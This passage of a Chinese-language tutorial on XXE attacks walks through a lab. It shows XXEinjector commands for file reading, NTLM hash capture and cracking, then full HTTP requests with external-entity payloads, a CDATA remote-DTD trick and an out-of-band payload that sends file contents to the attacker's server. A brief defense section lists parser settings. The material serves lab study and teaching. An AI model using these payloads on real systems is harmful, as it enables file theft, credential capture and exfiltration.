&lt;&#x2F;span&gt;&lt;span&gt;--contimeout     设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
&lt;&#x2F;span&gt;&lt;span&gt;--fast           跳过枚举询问，有可能出现结果假阳性。
&lt;&#x2F;span&gt;&lt;span&gt;--verbose        显示verbose信息。
&lt;&#x2F;span&gt;&lt;span&gt;一、读取文件：
&lt;&#x2F;span&gt;&lt;span&gt;ruby XXEinjector.rb --host=192.168.0.110 --path=c:&#x2F;flag.txt --httpport=80 --file=req.txt --verbose --oob=http --phpfilter
&lt;&#x2F;span&gt;&lt;span&gt;二、获取Windows 用户Hash
&lt;&#x2F;span&gt;&lt;span&gt;1、启动msf，执行use auxiliary&#x2F;server&#x2F;capture&#x2F;smb ,set johnpwfile &#x2F;tmp&#x2F;john, run
&lt;&#x2F;span&gt;&lt;span&gt;2、执行： ruby XXEinjector.rb --host=192.168.0.110  --file=req.txt --hashes --verbose
&lt;&#x2F;span&gt;&lt;span&gt;3、查看&#x2F;tmp&#x2F;john中的Hash
&lt;&#x2F;span&gt;&lt;span&gt;4、执行命令破解：john --format=netntlmv2 &#x2F;tmp&#x2F;john，或john &#x2F;tmp&#x2F;john_netntlm --format=netntlm
&lt;&#x2F;span&gt;&lt;span&gt;三、目录浏览：
&lt;&#x2F;span&gt;&lt;span&gt;ruby XXEinjector.rb --host=10.2.7.180 --path=c:&#x2F; --file=req3.txt --verbose
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;xxefang-yu&quot;&gt;XXE防御&lt;&#x2F;h1&gt;
&lt;p&gt;过滤关键词：&amp;lt;!DOCTYPE和&amp;lt;!ENTITY，或者SYSTEM和PUBLIC&lt;br &#x2F;&gt;PHP下&lt;br &#x2F;&gt;libxml_disable_entity_loader(true);&lt;br &#x2F;&gt;python下&lt;br &#x2F;&gt;from lxml import etree&lt;br &#x2F;&gt;xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))&lt;br &#x2F;&gt;Java下&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623934129947-82a4b1eb-eae4-44c4-b71b-710f937da0b7.png#align=left&amp;amp;display=inline&amp;amp;height=1142&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.48.34.png&amp;amp;originHeight=1142&amp;amp;originWidth=2032&amp;amp;size=741526&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2032&quot; alt=&quot;截屏2021-06-17 下午8.48.34.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xxelou-dong-shi-zhan&quot;&gt;XXE漏洞实战&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;phpyu-yan-xia-de-xxelou-dong-shi-zhan&quot;&gt;PHP语言下的XXE漏洞实战&lt;&#x2F;h2&gt;
&lt;p&gt;环境：&lt;a href=&quot;http:&#x2F;&#x2F;gv7.me&#x2F;&quot;&gt;c0ny1&lt;&#x2F;a&gt;的xxe-lab&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623953489264-c04a8a17-b83b-42ac-ba80-a32475cfb9a1.png#align=left&amp;amp;display=inline&amp;amp;height=1666&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.11.16.png&amp;amp;originHeight=1666&amp;amp;originWidth=2536&amp;amp;size=385603&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2536&quot; alt=&quot;截屏2021-06-18 上午2.11.16.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;目标&lt;br &#x2F;&gt;寻找C盘下的flag&lt;&#x2F;p&gt;
&lt;p&gt;首先利用burp抓包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623953683517-891b61c7-f7ff-4eb6-8792-ba7da301bc1c.png#align=left&amp;amp;display=inline&amp;amp;height=1750&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.14.20.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;size=483256&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-18 上午2.14.20.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在repeater中改包发包&lt;br &#x2F;&gt;发送包修改为如下&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;POST &#x2F;php_xxe&#x2F;doLogin.php HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.43.231
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 158
&lt;&#x2F;span&gt;&lt;span&gt;Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q=0.01
&lt;&#x2F;span&gt;&lt;span&gt;X-Requested-With: XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;xml;charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;Origin: http:&#x2F;&#x2F;192.168.43.231
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.43.231&#x2F;php_xxe&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: zh-CN,zh;q=0.9
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;user[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY baz SYSTEM &amp;quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;baz;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;成功得到flag内容&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623956215547-e0b7c5d0-2a6b-4723-9943-8b09eb5111e9.png#align=left&amp;amp;display=inline&amp;amp;height=1750&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.56.41.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;size=661785&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-18 上午2.56.41.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623957654248-590a87a0-3da1-4d7a-995a-2239d6ba891b.png#align=left&amp;amp;display=inline&amp;amp;height=1196&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%883.19.43.png&amp;amp;originHeight=1196&amp;amp;originWidth=1532&amp;amp;size=345572&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1532&quot; alt=&quot;截屏2021-06-18 上午3.19.43.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;xxelou-dong-du-qu-you-te-shu-zi-fu-de-wen-jian&quot;&gt;XXE漏洞读取有特殊字符的文件&lt;&#x2F;h2&gt;
&lt;p&gt;上面所述的flag文件中的字符都是普通字符，如果flag文件中的内容为一段PHP代码，则无法输出。例如，文件的内容为flag{&lt;?php phpinfo();?&gt;}，则只会输出flag{}。&lt;br &#x2F;&gt;所以需要用到CDATA&lt;br &#x2F;&gt;被&lt;code&gt;&amp;lt;![CDATA[]]&amp;gt;&lt;&#x2F;code&gt;这个标记所包含的内容将表示为&lt;strong&gt;纯文本&lt;&#x2F;strong&gt;，比如&lt;code&gt;&amp;lt;![CDATA[&amp;lt;]]&amp;gt;&lt;&#x2F;code&gt;表示文本内容&lt;code&gt;&amp;lt;&lt;&#x2F;code&gt;。&lt;br &#x2F;&gt;此标记用于xml文档中，我们先来看看使用转义符的情况。我们知道，在xml中，&lt;code&gt;&amp;lt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;gt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;amp;&lt;&#x2F;code&gt;等字符是不能直接存入的，否则xml语法检查时会&lt;strong&gt;报错&lt;&#x2F;strong&gt;，如果想在xml中使用这些符号，必须将其转义为实体，如&lt;code&gt;&amp;amp;lt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;amp;gt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;amp;amp;&lt;&#x2F;code&gt;，这样才能保存进xml文档。&lt;br &#x2F;&gt;在使用程序读取的时候，解析器会自动将这些实体转换回&lt;code&gt;&amp;lt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;gt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;amp;&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;那么如何读取存在特殊字符的文件呢？&lt;br &#x2F;&gt;首先，写下如下代码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;all &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;quot;%start;%baz;%stop;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;再将这段代码命名为blaze.dtd，并上传到另一台服务器，这里以 Kali Linux 为例&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623973757345-d4a35c15-908f-4d99-8cb9-6ea6d7232c14.png#align=left&amp;amp;display=inline&amp;amp;height=97&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.49.01.png&amp;amp;originHeight=180&amp;amp;originWidth=824&amp;amp;size=82233&amp;amp;status=done&amp;amp;style=none&amp;amp;width=443&quot; alt=&quot;截屏2021-06-18 上午7.49.01.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;python -m http.server    启动监听&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623973899142-c3cad7e7-a0b9-4045-a34e-699787478abd.png#align=left&amp;amp;display=inline&amp;amp;height=54&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.51.27.png&amp;amp;originHeight=118&amp;amp;originWidth=970&amp;amp;size=64864&amp;amp;status=done&amp;amp;style=none&amp;amp;width=443&quot; alt=&quot;截屏2021-06-18 上午7.51.27.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;将发送报文修改为如下&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;POST &#x2F;php_xxe&#x2F;doLogin.php HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.43.231
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 297
&lt;&#x2F;span&gt;&lt;span&gt;Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q=0.01
&lt;&#x2F;span&gt;&lt;span&gt;X-Requested-With: XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;xml;charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;Origin: http:&#x2F;&#x2F;192.168.43.231
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.43.231&#x2F;php_xxe&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: zh-CN,zh;q=0.9
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;user[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % baz SYSTEM &amp;quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % start &amp;quot;&amp;lt;![&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;CDATA&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!ENTITY % stop &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]]&amp;gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % dtd SYSTEM &amp;quot;http:&#x2F;&#x2F;192.168.43.147:8000&#x2F;blaze.dtd&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;%dtd;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;all;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;发包后，kali处也接到请求&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623974094378-18f32fa0-a4fe-48a6-a505-56634fc7231e.png#align=left&amp;amp;display=inline&amp;amp;height=56&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.54.44.png&amp;amp;originHeight=146&amp;amp;originWidth=1194&amp;amp;size=98447&amp;amp;status=done&amp;amp;style=none&amp;amp;width=462&quot; alt=&quot;截屏2021-06-18 上午7.54.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;与此同时，收到的回复包中，也已经显示出了带有特殊字符内容的flag文件的内容&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623974258932-818b89ba-1a7f-457a-a2c7-9a7844ce4add.png#align=left&amp;amp;display=inline&amp;amp;height=1750&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.57.22.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;size=663742&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-18 上午7.57.22.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;xxewu-hui-xian-du-qu-min-gan-wen-jian&quot;&gt;XXE无回显读取敏感文件&lt;&#x2F;h2&gt;
&lt;p&gt;无回显的情况下，可以让目标服务器（携带flag）向我们自己的一台服务器发起请求，在请求中携带自己内部的flag&lt;br &#x2F;&gt;首先在我们自己的服务器上存储如下内容的一个文件&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % payload &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;#x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;25;&lt;&#x2F;span&gt;&lt;span&gt; send SYSTEM &amp;#39;http:&#x2F;&#x2F;192.168.43.147&#x2F;?content=%file;&amp;#39;&amp;gt;&amp;quot;&amp;gt;%payload;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;其中 &amp;amp;#x25 是 % 的html编码，作为payload的实体内容，有双引号包裹下，必须用html编码形式，因为实体的值中不能有 %&lt;br &#x2F;&gt;这里使用“实体定义作为另一个实体定义下的实体内容”的形式来实现&lt;br &#x2F;&gt;另外，其中的IP地址 192.168.43.147 即是此文件所在服务器的IP地址&lt;&#x2F;p&gt;
&lt;p&gt;启动我们服务器的监听&lt;br &#x2F;&gt;将发送报文改为如下内容&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;POST &#x2F;php_xxe&#x2F;doLogin.php HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.43.231
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 286
&lt;&#x2F;span&gt;&lt;span&gt;Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q=0.01
&lt;&#x2F;span&gt;&lt;span&gt;X-Requested-With: XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;xml;charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;Origin: http:&#x2F;&#x2F;192.168.43.231
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.43.231&#x2F;php_xxe&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: zh-CN,zh;q=0.9
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;user[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % file SYSTEM &amp;quot;php:&#x2F;&#x2F;filter&#x2F;read=convert.base64-encode&#x2F;resource=c:&#x2F;flag.txt&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % dtd SYSTEM &amp;quot;http:&#x2F;&#x2F;192.168.43.147&#x2F;evil.xml&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;%dtd;
&lt;&#x2F;span&gt;&lt;span&gt;%send;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
